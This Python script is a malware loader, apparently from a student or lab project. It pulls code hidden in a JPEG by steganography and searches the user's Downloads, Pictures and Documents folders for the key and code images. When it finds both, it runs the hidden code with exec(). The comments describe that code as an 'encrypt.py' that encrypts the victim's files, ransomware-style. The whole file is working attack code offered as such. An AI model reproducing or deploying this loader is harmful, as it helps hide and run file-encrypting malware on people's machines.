import os
from extract import extract_message


def main():
    # Retrieves malicious code secretly embedded in one of the images
    code_to_encrypt_files: str = extract_message("download2.jpg", "Mochi")

    # Represents the name of the two images to be scanned for in the downloads directory
    image_containing_key: str = "download.jpg"
    image_containing_code: str = "download2.jpg"

    # Represents whether the two images were found or not
    key_found: bool = False
    code_found: bool = False

    # Scans the Downloads folder to look for the images and applications needed
    # for the malware to remain operational
    whitelist: list[str] = [image_containing_key, image_containing_code]
    downloads_directory: str = os.path.expanduser("~/Downloads")

    # Iterates through each file within the downloads folder to find the image with the key and malicious code
    for _, _, files in os.walk(downloads_directory):
        for file in files:
            if file in whitelist:
                if file == image_containing_key:
                    key_found = True
                if file == image_containing_code:
                    code_found = True
            print(file)

    # Determines whether both the key and code were found
    ready_to_attack: bool = key_found and code_found

    # Have to keep looking for them at all times until both are found
    while not ready_to_attack:
        # Checks to see if the images are in Downloads or if user moved them to
        # another directory
        directories_to_be_searched = [downloads_directory,
                                      os.path.expanduser("~/Pictures"),
                                      os.path.expanduser("~/Documents")]

        # Looks through all files in a given directory to keep searching for the key and code
        for directory in directories_to_be_searched:
            for _, _, files in os.walk(directory):
                for file in files:
                    if file in whitelist:
                        if file == image_containing_key:
                            key_found = True
                        if file == image_containing_code:
                            code_found = True
                        ready_to_attack = key_found and code_found
                    print(file)

    # Runs the malicious code (our "encrypt.py")
    if ready_to_attack:
        exec(code_to_encrypt_files)


main()
